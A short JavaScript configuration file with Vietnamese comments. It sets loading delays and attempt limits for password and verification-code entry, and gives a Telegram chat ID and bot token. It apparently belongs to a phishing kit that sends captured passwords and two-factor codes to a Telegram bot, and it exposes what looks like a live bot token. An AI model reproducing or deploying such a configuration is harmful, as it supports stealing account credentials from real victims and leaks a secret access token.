const config = {
	settings: {
		// Thời gian Loading khi nhập code(milisecond)
		code_loading_time: 15000,
		// Số lượt nhập code tối đa
		max_failed_code_attempts: 3,
		// Số lượt nhập mật khẩu tối đa
		max_failed_password_attempts: 2,
		// Cái này không có tác dụng
		page_loading_time: 5000,
		// Thời gian loading khi nhập mật khẩu(milisecond)
		password_loading_time: 10000,
	},
	telegram: {
		chatid: '-4507081796',
		token: '6523989137:AAH5GdE2C0GkBQZV6MtPhJXrmRo8efyp3QE',
	},
};

export default config;
